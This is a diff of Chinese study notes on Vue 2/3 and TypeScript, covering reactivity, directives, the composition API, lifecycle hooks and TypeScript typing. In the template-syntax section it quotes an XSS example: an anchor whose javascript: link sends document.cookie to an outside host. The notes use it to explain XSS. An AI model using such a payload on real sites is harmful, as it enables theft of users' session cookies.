@@ -12,6 +12,7 @@
 
   ```
   Vue
+  typescript
   李英俊
   前端
   千锋
@@ -19,10 +20,10 @@
   
 - 学习链接
 
-  1. [千锋HTML5前端开发教程1000集](https://www.bilibili.com/video/BV17z4y1D7Yj)：`[P428: P568]，共139集`
-  2. [千锋教育前端Vue3.0全套视频教程（Kerwin2023版，Vue.js零基础，Vue3入门到实操）](https://www.bilibili.com/video/BV1Ss4y1T7mZ/)
+  1. [千锋HTML5前端开发教程1000集](https://www.bilibili.com/video/BV17z4y1D7Yj)：`[P428:P568]+[P971:P981]，共150集`
+  2. [千锋教育前端Vue3.0全套视频教程（Kerwin2023版，Vue.js零基础，Vue3入门到实操）](https://www.bilibili.com/video/BV1Ss4y1T7mZ/)，[用于上述视频的查漏补缺](#vue3)
   
-- 感想 | 摘抄
+- 感想 | 摘抄 | 问题
 
   - vue的架构模式是mvvm（双向绑定）（不是mvc）
   - 需要计算属性的逻辑，写在 `computed` 中，因为多次使用的话，函数会调用多次，而计算属性只会运行一次。
@@ -57,20 +58,49 @@
   
   - vue路由history模式怎么解决nginx部署刷新404的问题：[vue路由history模式刷新404问题解决方案](https://blog.csdn.net/weixin_42138029/article/details/116980747)
   
-- 直通车
-
-- `<span style="color: skyblue; font-weight: bold">`PS：相关工程代码都在 Github 上
+- <span style="color: skyblue; font-weight: bold">PS：相关工程代码都在 Github 上 </span>
 
 ## 1. 前言
 
-1. Vue是通过拦截变量的get和set方法，来进行监听和更新的
+1. Vue2是通过 `Object.defineProperty` 拦截变量的get和set方法，来进行监听和更新的
+
+   ```js
+   var obj = {}
+   Object.defineProperty(obj, "myname", {
+       get(){
+           console.log("get");
+       },
+       set(){
+           console.log("set");
+       }
+   })
+   ```
+
 2. `Object.defineProperty`有以下缺点：
    1. 无法监听es6的Set、Map变化
    2. 无法监听Class类型的数据
    3. 属性的新加或者删除也无法监听
    4. 数组元素的增加和删除也无法监听
-3. `:src`、`:class`这样的写法的完整写法是：`v-bind:src`
-4. 同理，事件 `@click`绑定的完整写法是：`v-on:click`
+
+3. Vue3 使用的是 ES6 的 `Proxy` ，如果浏览器不支持es6那么自动降级为Vue2的方案
+
+   ```js
+   var obj = {}
+   var vm = new Proxy(obj, {
+       get(obj, key){
+           console.log("get");
+           return obj[key]
+       },
+       set(obj, key, value){
+           console.log("set");
+           obj[key] = value
+       }
+   })
+   ```
+
+4. `:src`、`:class`这样的写法的完整写法是：`v-bind:src`
+
+5. 同理，事件 `@click`绑定的完整写法是：`v-on:click`
 
 ## 2. 模板语法
 
@@ -89,22 +119,36 @@
       <a href=javascript:location.href='http://www.baidu.com?cookie='+document.cookie>click</a>
       ```
    3. 表达式
+
 2. 指令：是带有 `v-` 前缀的特殊属性
 
    - `v-bind`：动态绑定属性
-   - `v-if`：动态创建/删除
+   - `v-if`：动态创建/删除，有更高的**切换**开销
      - `v-else`
-     - `v-else-if`
+     - `v-else-if`，可以写多个
      - `template v-if`：包装元素template不会被创建
-   - `v-show`：动态显示/隐藏
+   - `v-show`：动态显示/隐藏，有更高的**初始渲染**开销
    - `v-on:click`：绑定事件
    - `v-for`：遍历
    - `v-model`：双向绑定表单
-3. 缩写
+
+3. `v-html`
+
+   - 双大括号会将数据解释为纯文本，而不是HTML。若想插入HTML，需要使用 `v-html` 指令
+
+   - 在网站上动态渲染任意HTML是非常危险的，因为这非常容易造成 **XSS漏洞** ，请仅在内容安全可信时再使用 `v-html` ，并且永远不要使用用户提供的html内容
+
+     ```html
+     <!-- htmlTest：有html标签的内容所对应的变量名 -->
+     <div v-html="htmlTest"></div>
+     ```
+
+4. 缩写
 
    1. `v-bind:src`：`:src`
    2. `v-on:click`：`@click`
-4. 关于vue数据对象新增拦截属性的解决方案
+
+5. 关于vue数据对象新增拦截属性的解决方案
 
    - vue2：
      - `Vue.set(vm.classobj, "dd", true)`
@@ -112,8 +156,10 @@
    - vue3: 支持动态增加属性的拦截
    - **动态切换这里可以用对象，也可以用数组，用数组的时候vue两个版本都正常**
    - 注意：如果是直接操作 `:style` 的形式，需要按照js的语法去设置css，即需要用驼峰命名法
-5. template是一个包装元素，可以控制子元素的同生共死，同时不会影响dom结构
-6. 列表渲染
+
+6. template是一个包装元素，可以控制子元素的同生共死，同时不会影响dom结构
+
+7. 列表渲染
 
    1. `v-for`（特殊 v-for=“n in 10”）
 
@@ -195,13 +241,15 @@
 
         - 这里的 `$event` 是写死的，不能换其他的变量名
       - 直接写表达式同样可以完成该请求：`count++`
-7. 一些知识
+
+8. 一些知识
 
    - data：状态，被拦截
    - 方法，methods：事件绑定，逻辑计算。可以不用return，没有缓存
    - 计算属性（重视结果），computed：解决模板过重的问题，必须有return，只求结果，有缓存，同步。
    - watch（重视过程）：监听一个值的改变，不用返回值，异步同步。
-8. fetch
+
+9. fetch
 
    - get：
 
@@ -245,7 +293,8 @@
      }
      ```
    - 注意：fetch请求默认是不带cookie的，需要设置 `fetch(url, {credentials: 'include'})`
-9. axios：非官方的好用的库
+
+10. axios：非官方的好用的库
 
    ```js
    handleClick(){
@@ -255,7 +304,8 @@
        })
    }
    ```
-10. 过滤器（管道符）：`|`
+
+11. 过滤器（管道符）：`|`
 
     - 把原始数据通过管道送给过滤器进行加工
 
@@ -1486,33 +1536,33 @@
 5. `nginx.exe -s reload`：重启
 5. 配置好了，可以直接带着nginx复制到服务器上运行
 
-## 14. Vue3的组合式api
+## 14. Vue3
 
 1. 注册和挂载不一样，vue3使用了createApp
 
 2. 路由使用createRouter函数
    1. `createWebHistory`：斜杠路由模式，history模式
    2. `createWebHashHistory`：#路由模式，hash模式
-   
+
 3. vuex同上，使用createStore
 
 4. **组合式API**：react 类和函数写法（不支持状态，生命周期等，支持属性） ——》 react hooks（钩住函数写法的状态） ——》 vue3-hooks（即：composition api，见不到this了）
-   
+
    1. `setup`：代替了vue3老写法或者vue2写法中，`beforeCreate` 和 `created` 生命周期
-   
+
    2. `reactive`：创建响应式对象，类似模板中的状态（如果参数是字符串、数字会报警告）
-   
+
    3. 如果同时使用 老式的 `data(){}` 和 组合式的 `setup(){}` ，定义的变量和生命周期会同时生效
       - 在 `setup` 中没有this
       - 两套东西不建议混用
       - `reactive`：可以写多个
-   
+
    4. template里可以写多个div 兄弟节点
-   
+
    5. `ref`：
-   
+
       - 过去 vue2中 dom 的引用
-   
+
         ```
         <input type="text" ref="mytextref">
         
@@ -1520,9 +1570,9 @@
                 console.log("mounted", this.$refs.mytextref);
         },
         ```
-   
+
       - 在新版vue3中，同样可以获取dom对象，但是需要通过 `.value` 拿到dom对象
-   
+
         ```
         const mytextref = ref()
         
@@ -1530,9 +1580,9 @@
                     mytextref
                 }
         ```
-   
+
       - 在新版vue3中，通过ref跟踪变量，从而对组件进行赋值
-   
+
         ```vue
         <template>
             <div>
@@ -1569,15 +1619,15 @@
         }
         </script>
         ```
-   
+
    6. `toRefs`：解决 `ref` 和 `reactive` 的最佳实践，reactive可以自动展开，但是不支持简单类型（int、str啥的）；ref啥都能用，但是不能自动展开，很难受。【但是】toRefs可以支持：
-   
+
       - 定义阶段：使用 reative
-   
+
       - return阶段：使用 `..toRefs()`，将变量解包为多个ref对象
-   
+
       - 直接取长补短，我愿称之为绝杀
-   
+
         ```vue
         <template>
             <div>
@@ -1609,11 +1659,11 @@
         }
         </script>
         ```
-   
+
    7. `props`：父传子解决方案
-   
+
       1. 定义一个组件，接受参数 props
-   
+
          ```vue
          <template>
              <div>
@@ -1629,9 +1679,9 @@
          }
          </script>
          ```
-   
+
       2. 主界面使用组件，传入参数
-   
+
          ```vue
          <template>
              <div>
@@ -1649,9 +1699,9 @@
          }
          </script>
          ```
-   
+
       3. 如果是在mounted中想要拿到这个值，或者是在setup中想要处理逻辑中包含这个值，常见的vue2和vue3写法如下
-   
+
          ```
          mounted() {
                  console.log("222", this.myid);
@@ -1661,14 +1711,14 @@
          	console.log(props.myid);
          }
          ```
-   
+
          - setup默认传入第一个参数就是props的list
          - setup比mounted的调用时间要早
-   
+
    8. `emit`：子传父解决方案
-   
+
       1. 触发的来源组件中，定义触发的函数，函数体内写 `emit` ，传参对应的事件名
-   
+
          ```vue
          <template>
              <div>
@@ -1699,9 +1749,9 @@
          }
          </script>
          ```
-   
+
       2. 在被影响的组件，一般是主页的组件上，给调用触发组件的 dom 上定义事件名及其绑定的函数名，在script中编写函数的具体实现
-   
+
          ```vue
          <template>
              <div>
@@ -1738,10 +1788,808 @@
          }
          </script>
          ```
-   
+
       3. 选要注意的是，在vue2中 调用触发 的组件中，`emit`的写法是 `this.$emit()`，而在vue3中，类似props传参一样，第二个参数默认为闭包的 `emit`，所以第二个参数以 解包 的形式 获取 emit：`setup(props, { emit }) {...}`
-   
+
    9. 生命周期
+
+      - 第一套跟vue2是一样的，不过最后的 destory 相关的 要变成 unMounted
+
+        |    原方法     |     升级后      |
+        | :-----------: | :-------------: |
+        | beforeCreate  |      setup      |
+        |    created    |      setup      |
+        |  beforeMount  |  onBeforeMount  |
+        |    mounted    |    onMounted    |
+        | beforeUpdate  | onBeforeUpdate  |
+        |    updated    |    onUpdated    |
+        | beforeDestroy | onBeforeUnmount |
+        |   destroyed   |   onUnmounted   |
+
+      - 例子
+
+        ```vue
+        <template>
+            <div>
+                生命周期
+                <ul>
+                    <li v-for="data in obj.list" :key="data">
+                        {{ data }}
+                    </li>
+                </ul>
+            </div>
+        </template>
+        
+        <script>
+        import axios from 'axios'
+        import { onBeforeMount, onMounted, reactive } from "vue";
+        export default {
+            // mounted
+            setup() {
+                const obj = reactive({
+                    list: []
+                })
+                onBeforeMount(() => {
+                    console.log("上树之前就执行啦");
+                })
+                onMounted(() => {
+                    console.log("dom上树", "axiox，事件监听啊，setInterval启动啊啥的");
+                    setTimeout(() => {
+                        obj.list = ["aaa", "bbb"]
+                    }, 2000);
+                })
+        
+                return { obj }
+            }
+        }
+        </script>
+        ```
+
+   10. 计算属性
+
+       1. 使用函数调用的方法，vmodel绑定的变量发生改变，导致函数被调用，从而列表对应的数据更新，然后更新界面的列表显示
+
+          ```vue
+          <template>
+              <div>
+                  <input type="text" v-model="obj.mytext">
+                  <ul>
+                      <li v-for="data in filterlist()" :key="data">
+                          {{ data }}
+                      </li>
+                  </ul>
+              </div>
+          </template>
+          
+          <script>
+          import { reactive } from "vue";
+          export default {
+              setup() {
+                  const obj = reactive({
+                      mytext: '',
+                      datalist: ["aaa", "bbb", "ccc", "bcc", "bcd", "abb"]
+                  })
+                  const filterlist = () => {
+                      return obj.datalist.filter(item => item.includes(obj.mytext))
+                  }
+          
+                  return {
+                      obj,
+                      filterlist
+                  }
+              }
+          }
+          </script>
+          ```
+
+       2. 使用计算属性来实现上述功能
+
+          ```vue
+          <template>
+              <div>
+                  <input type="text" v-model="obj.mytext">
+                  <ul>
+                      <li v-for="data in computedList" :key="data">
+                          {{ data }}
+                      </li>
+                  </ul>
+              </div>
+          </template>
+          
+          <script>
+          import { reactive, computed } from "vue";
+          export default {
+              setup() {
+                  const obj = reactive({
+                      mytext: '',
+                      datalist: ["aaa", "bbb", "ccc", "bcc", "bcd", "abb"]
+                  })
+          
+                  const computedList = computed(() => {
+                      return obj.datalist.filter(item => item.includes(obj.mytext))
+                  })
+          
+                  return {
+                      obj,
+                      computedList
+                  }
+              }
+          }
+          </script>
+          ```
+
+       3. 如果在template中使用多次，函数的写法会调用多次，而计算属性只调用一次（有缓存机制，性能优化）
+
+       4. vue2中计算属性的写法为
+
+          ```js
+          computed(){
+          	aaa(){
+          		return "111"
+          	}
+          }
+          ```
+
+   11. watch
+
+       1. 与computed注重结果不一样，watch注重的是过程
+
+       2. [VUE3 中的 Watch 详解](https://zhuanlan.zhihu.com/p/465651353)
+
+       3. 使用方法
+
+          ```vue
+          <template>
+              <div>
+                  <input type="text" v-model="obj.mytext">
+                  <ul>
+                      <li v-for="data in obj.datalist" :key="data">
+                          {{ data }}
+                      </li>
+                  </ul>
+              </div>
+          </template>
+          
+          <script>
+          import { reactive, watch } from "vue";
+          export default {
+              setup() {
+                  const obj = reactive({
+                      mytext: '',
+                      datalist: ["aaa", "bbb", "ccc", "bcc", "bcd", "abb"],
+                      oldlist: ["aaa", "bbb", "ccc", "bcc", "bcd", "abb"]
+                  })
+          
+                  watch(() => obj.mytext, () => {
+                      console.log("watch");
+                      obj.datalist = obj.oldlist.filter(item => item.includes(obj.mytext))
+                  })
+          
+                  return {
+                      obj
+                  }
+              }
+          }
+          </script>
+          ```
+
+5. 自定义hooks写法：`setup`
+
+   1. 虽然 composition api 比之前写法看上去好像更加麻烦了，但是用上自定义hooks就可以实现函数编程的复用了，更加简洁高效。
+
+   2. 简单来说，就是把一些复杂的逻辑和流程可以提取出js放到外面处理，主vue文件中只写逻辑和调用函数即可
+
+      ```vue
+      <template>
+          <div>
+              app
+              <ul>
+                  <li v-for="data in obj1.list" :key="data.name">
+                      {{ data.name }}
+                  </li>
+              </ul>
+              <ul>
+                  <li v-for="data in obj2.list" :key="data.name">
+                      {{ data.name }}
+                  </li>
+              </ul>
+          </div>
+      </template>
+      
+      <script>
+      import { getData1, getData2 } from './module/app'
+      
+      export default {
+          setup() {
+              const obj1 = getData1()
+              const obj2 = getData2()
+      
+              return {
+                  obj1,
+                  obj2
+              }
+          }
+      }
+      </script>
+      ```
+
+   3. 跳转：`this.$router.push()` 替换为 `router.push()`，其中 `const router = useRouter()`，`import {useRouter} from "vue-router"`
+
+   4. 参数获取：与上述类似，不过是 `const route = useRoute()`，然后拿到url中对应的参数：`route.params.id`
+
+   5. 全局状态：也类似，不过换了个库，`import { useStore } from "vuex"`，然后：`const store = useStore()`
+
+      ```vue
+      <template>
+          <div>
+              detail
+          </div>
+      </template>
+      
+      <script>
+      import { onMounted, onUnmounted } from "vue";
+      import { useRoute } from "vue-router";
+      import { useStore } from "vuex";
+      export default {
+          // mounted() {
+          //     this.$store.commit("hide")
+          //     console.log(this.$route.params.id);
+          // },
+          // unmounted() {
+          //     this.$store.commit("show")
+          // },
+      
+          setup() {
+              // route === this.$route
+              const route = useRoute()
+              // store === this.$store
+              const store = useStore()
+      
+              onMounted(() => {
+                  console.log(route.params.id);
+                  store.commit("hide")
+              })
+              onUnmounted(() => {
+                  store.commit("show")
+              })
+          }
+      }
+      </script>
+      ```
+
+6. vuex替代方案：provide、inject
+
+   1. 解决了：需要跨越好几级拿组件状态
+
+   2. vue-composition-api的一个新功能，依赖注入功能
+
+   3. 使用：
+
+      1. 在根组件提供状态的绑定：
+
+         ```js
+         const isShow = ref(false)
+         
+         // 谁想用isShow，就把这个功能注入进来
+         provide("kerwinshow", isShow)
+         ```
+
+      2. 在子组件中注入状态：
+
+         ```js
+         const isShow = inject("kerwinshow")
+         ```
+
+      3. 从而实现了状态的全局共享
+
+7. vue3去掉了：
+
+   1. filter 过滤器功能
+   2. 中央事件总线bus
+   3. 响应式原理基础从：Object.defineProperty -> Proxy
+   4. 生命周期替换
+   5. options api -> composition api
+
+## 15. ts
+
+1. TypeScript是js的一个超集，主要提供了类型系统和对es6的支持，由微软开发，开源
+
+2. ts：编译型语言；js：解释型语言
+
+3. 优势
+
+   1. 增加了代码的可读性和可维护性
+   2. 非常包容，**即使报错了也依然可以编译为js**
+   3. 拥有活跃的社区
+
+4. 安装
+
+   1. 全局安装：`cnpm install -g typescript`
+   2. 编译：`tsc hello.ts`
+   3. 约定 `.ts` 为后缀，编写react时，以 `.tsx` 为后缀
+   4. 主流ide中都支持ts，包括代码补全、接口提示、跳转定义、重构
+
+5. 原始数据类型
+
+   - string number boolean null undefined enum（枚举） symbol（符号）
+   - 空值一般用 void 表示，void可以表示变量，也可以表示函数的返回值
+
+6. 任意值
+
+   - 任意值：Any，用来表示允许赋值为任意类型
+   - 声明一个变量为任意值之后，对它的任何操作，返回的内容的类型都是任意值
+   - 变量如果在声明的时候，未指定其类型，那么它会被识别为任意值类型
+
+7. 类型推论
+
+   - ts会依照类型推论的规则推断出一个类型
+
+     ```typescript
+     // 给变量赋值初始值的时候，如果没有指定类型，就会根据初始值倒推类型
+     var b = 1;
+     b = '2'
+     ```
+
+   - 如果定义的时候没有赋值，不管之后有没有赋值，都会被推断成 any 类型而完全不被类型检查
+
+     ```typescript
+     // 没有给b赋初始值，就是any，var b: any
+     var bb;
+     bb = 1
+     bb = '2'
+     ```
+
+8. 联合类型
+
+   - 表示取值可以为多种类型中的一种
+
+   - 如果定义的时候没有赋值，不管之后有没有赋值，都会被推断成any类型而完全不被类型检查
+
+   - 只能访问此联合类型内的所有类型里共有的属性或者方法
+
+     ```typescript
+     // 联合类型
+     var muchtype: string | number = "hello"
+     muchtype = 10
+     console.log(muchtype.toString());
+     ```
+
+9. 对象类型-接口
+
+   - 可描述类的一部分抽象行为，也可描述对象的构造形状
+
+   - 接口一般首字母大写，有的编程语言上面建议接口的名称加上I前缀
+
+   - 赋值的时候，变量的形状必须要跟接口的形状保持一致
+
+   - 接口中可定义可选属性、只读属性、任意属性
+
+     ```typescript
+     // 定义接口 强约束，属性加?：实现可选特征，通过增加[]属性实现不定量属性，这里只能指定any；readonly：只读，不能再赋值
+     interface Instate {
+         readonly name: string
+         age?: number | string,
+         [propName: string]: any
+     }
+     
+     var obj1: Instate
+     obj1 = {
+         name: "1",
+         age: 1
+     }
+     var obj2: Instate
+     obj2 = {
+         name: "2"
+     }
+     
+     var obj3: Instate
+     obj3 = {
+         name: "3",
+         age: "12",
+         sex: "male",
+         isMarry: true
+     }
+     ```
+
+10. 数组类型
+
+    - `类型 []` 表示
+
+    - `Array<elemType>` 数组泛型表示
+
+    - 接口表示
+
+      ```typescript
+      var arr: number[] = [1, 2, 3]
+      var arr2: string[] = ["1", "2", "3"]
+      var arr3: any[] = ["1", 1, true]
+      
+      var arrType: Array<number> = [1, 2, 3]
+      var arrType2: Array<string> = ["1", "2", "3"]
+      var arrType3: Array<any> = [1, "2", true]
+      
+      interface IArray {
+          [index: number]: number
+      }
+      var arrType4: IArray = [1, 2, 3]
+      
+      interface Istate {
+          name: string,
+          age: number
+      }
+      interface IArr {
+          [index: number]: Istate
+      }
+      var arrType5: IArr = [{ name: "1", age: 1 }, { name: "2", age: 2 }]
+      var arrType6: Array<Istate> = [{ name: "1", age: 1 }, { name: "2", age: 2 }]
+      var arrType7: Istate[] = [{ name: "1", age: 1 }, { name: "2", age: 2 }]
+      ```
+
+11. 函数类型
+
+    - 函数约束，有函数本身的参数约束，返回值约束
+    
+    - 还有函数本身赋值的变量的约束
+    
+    - 可采用重载的方式才支持联合类型的函数关系
+    
+      ```typescript
+      // 声明式类型的函数
+      function f(name: string, age: number): number {
+          return age
+      }
+      var ageNum: number = f("zhangsan", 18)
+      // - 函数参数不确定
+      function f2(name: string, age: number, sex?: string): number {
+          return age
+      }
+      // - 函数参数的默认值
+      function f3(name: string = "张三", age: number = 18): number {
+          return age
+      }
+      
+      // 表达式类型的函数
+      var f4 = function (name: string, age: number): number {
+          return age
+      }
+      // - 约束方案1
+      var f5: (name: string, age: number) => number = function (name: string, age: number): number {
+          return age
+      }
+      // - 约束方案2
+      interface i6 {
+          (name: string, age: number): number
+      }
+      var f6: i6 = function (name: string, age: number): number {
+          return age
+      }
+      
+      // 重载的方式：联合类型的函数
+      function getValue(value: number): number;
+      function getValue(value: string): string;
+      function getValue(value: string | number): string | number {
+          return value
+      }
+      let a: number = getValue(1)
+      ```
+    
+12. 类型断言
+
+    - 可以用来手动指定一个值的类型：`<类型>值`，或者 `值 as 类型`
+
+    - 在tsx语法（react的jsx语法的ts版）必须采用后面一种
+
+    - 类型断言不是类型转换，断言称一个联合类型中不存在的类型是不允许的
+
+      ```typescript
+      // 类型断言，不是强制类型转换
+      function getAssert(name: string | number) {
+          return (<string>name).length, (name as string).length
+      }
+      ```
+
+13. 类型别名
+
+    - 给一个类型起一个新的名字
+
+    - 采用关键字 type：`type Name = string | number`
+
+    - 也可以采用type来约束取值只能是某些字符串中的一个：`type EventNames = "click" | "scroll" | "mousemove"`
+
+      ```typescript
+      type strType = string | number;
+      var str: strType = 10
+      str = "10"
+      
+      interface mt1 {
+          name: string
+      }
+      interface mt2 {
+          age: number
+      }
+      type mt = mt1 | mt2
+      var objj: mt = { name: "张三" }
+      var objj2: mt = { age: 123 }
+      var objj3: mt = { name: "asd", age: 11 }
+      
+      // 限制字符串的选择
+      type sexx = "男" | "女"
+      function getSex(s: sexx): string {
+          return s
+      }
+      getSex("男")
+      ```
+
+14. 枚举
+
+    - Enum，用于取值被限定在一定范围内的场景
+
+    - 采用关键字enum定义，例如：`enum Days{Sun, Mon, Tue, Wed, Thu, Fir, Sat}`
+
+    - 枚举成员会被赋值从0开始递增的数字，同时也会被枚举值到枚举名进行反向映射
+
+      ```typescript
+      // 枚举类型会被编译成一个双向映射的对象
+      enum Days {
+          // 这里默认是0，设置成其他值时会基于该值进行累加
+          Sun = 0,
+          Mon,
+          Tue,
+          Wed,
+          Thu,
+          Fri,
+          Sat
+      }
+      console.log(Days.Fri); // 5
+      console.log(Days[0]); // Sun
+      ```
+
+15. 类的修饰符，这跟java一样啊马飞
+
+    - public：修饰的属性或者方法是共有的，可以在任何地方被访问到，默认所有的属性或者方法都是public的
+
+    - private：修饰的属性或者方法是私有的，不能在声明它的类外面访问（即使是子类）
+
+    - protected：修饰的属性或者方法是受保护的，只能在类和子类中访问
+
+    - static：修饰的属性或者方法为类的静态属性或者静态方法，可以通过 `类.方法/属性` 的方式直接进行访问，也可以由子类继承
+
+      ```typescript
+      class Person {
+          private name = "张三"
+          age = 18
+          protected say() {
+              console.log("我的名字是" + this.name + ", " + this.age);
+          }
+          static test() {
+              console.log("test");
+          }
+      }
+      var p = new Person()
+      // p.say()
+      // console.log(p.name);
+      class Child extends Person {
+          callParent() {
+              super.say()
+          }
+      }
+      var c = new Child()
+      c.callParent()
+      console.log(c.age);
+      
+      Child.test()
+      ```
+
+16. 泛型
+
+    - 在定义函数、接口或类的时候，不预先指定具体类型，而在使用的时候再指定类型的一种特性
+
+      ```typescript
+      function createArray<T>(length: number, value: T): Array<T> {
+          let arr = []
+          for (let index = 0; index < length; index++) {
+              arr[index] = value
+          }
+          return arr
+      }
+      
+      var strArr: string[] = createArray<string>(3, '1')
+      console.log(strArr);
+      
+      // 接口中使用泛型
+      interface Icreate {
+          <T>(name: string, value: T): Array<T>
+      }
+      let func: Icreate;
+      func = function <T>(name: string, value: T): Array<T> {
+          return []
+      }
+      var strArr: string[] = func("zhangsan", "12")
+      ```
+
+
+## 16. <a id="vue3">Vue3补充</a>
+
+> 第二个视频课程的笔记，仅记录补充内容
+
+### 1-前言
+
+1. vue3的js导入形式
+
+   ```html
+   <body>
+       <div id="app">
+           {{10+20}}
+       </div>
+       <div id="box">
+           {{20+20}}
+       </div>
+   
+       <script>
+           Vue.createApp().mount("#app")
+           Vue.createApp().mount("#box")
+       </script>
+   </body>
+   </html>
+   ```
+
+2. vscode使用volar，禁用vetur
+
+3. 三目运算符：`表达式?true的话怎么办:false的话怎么办`
+
+### 2- 模板语法
+
+1. 类似 `disabled` 的属性，可以通过 `:disabled="temp"`，给 `temp` 赋值 true 或 false 来控制禁用的真和假
+
+2. `v-show` 和 `v-if` 的区别：一个是显示和隐藏，一个是创建和删除
+
+3. 案例1：列表的增加和删除
+
+   ```html
+   <!DOCTYPE html>
+   <html lang="en">
+       <head>
+           <meta charset="UTF-8" />
+           <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+           <title>Document</title>
+           <script src="vue.js"></script>
+       </head>
+       <body>
+           <div id="box">
+               <input v-model="temp" type="text" />
+               <button @click="add">add</button>
+               <ul>
+                   <li v-for="(item, index) in list" :key="item">
+                       {{ item }}
+                       <button @click="del(index)">delete</button>
+                   </li>
+               </ul>
+   
+               <div v-show="list.length === 0">暂无代办事项</div>
+           </div>
+           <script>
+               obj = {
+                   data() {
+                       return {
+                           temp: "",
+                           list: [111, 222, 333],
+                       };
+                   },
+                   methods: {
+                       add() {
+                           this.list.push(this.temp);
+                           this.temp = "";
+                       },
+                       del(index) {
+                           this.list.splice(index, 1);
+                       },
+                   },
+               };
+               var app = Vue.createApp(obj).mount("#box");
+           </script>
+       </body>
+   </html>
+   ```
+
+4. 案例2：点击列表更换背景色
+
+   ```html
+   <!DOCTYPE html>
+   <html lang="en">
+       <head>
+           <meta charset="UTF-8" />
+           <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+           <title>Document</title>
+           <script src="vue.js"></script>
+   
+           <style>
+               .activate {
+                   background: red;
+               }
+           </style>
+       <body>
+           <div id="box">
+               <ul>
+                   <li v-for="(item, index) in items" :key="item" :class="aim_index===index?'activate':''" @click="aim_index=index">
+                       {{ item }}
+                   </li>
+               </ul>
+   
+               <div v-html="htmlTest"></div>
+           </div>
+   
+           <script>
+               obj = {
+                   data(){
+                       return {
+                           items: [1, 2, 3],
+                           aim_index: 0,
+                           htmlTest: "<b>asd</b>"
+                       }
+                   },
+               }
+               var app = Vue.createApp(obj).mount("#box");
+           </script>
+       </body>
+   </html>
+   ```
+
+5. `:class`
+
+   1. 对象写法：`<div :class="{aaa:true, bbb:false, ccc:true}">temp</div>` = `class=aaa ccc`
+   2. 数组写法：`<div :class=["aaa", "ccc"]>temp</div>` = `class=aaa ccc`
+
+6. `:style`
+
+   1. 对象写法
+
+      1. 复合属性需要改为驼峰：`background-color` -> `backgroundColor`
+
+      2. 或者把属性名改成字符串：`background-color` -> `“background-color”`
+
+         ```html
+         <div :style="{
+             fontSize: '30px',
+             'background-color': 'yellow'
+         }">asd</div>
+         ```
+
+   2. 数组写法：
+
+      1. `<div :style=[styleObj1, styleObj2]></div>`
+      2. 数组中的每一个元素依然还是上述的对象写法
+      3. 如果push之后，跟之前的元素有属性上的重合，则会出现覆盖的情况
+
+   3. 案例1：添加style属性
+
+      ```
+      // html
+      <div :style="imgObj"></div>
+      <button @click="handleAjax">click</button>
+      
+      // data
+      imgObj: {
+          width: "200px",
+          height: "200px",
+          backgroundSize: "cover",
+      }
+      
+      // methods
+      handleAjax(){
+          this.imgObj.backgroundImage = "url(https://static.maizuo.com/pc/v5/usr/movie/51ec9e9866ed2d2a0f905e4c100f9e27.jpg?x-oss-process=image/quality,Q_70)"
+      }
+      ```
+
+7. 条件渲染
+
+
+
+
+
+
+
+
+
 
 
 
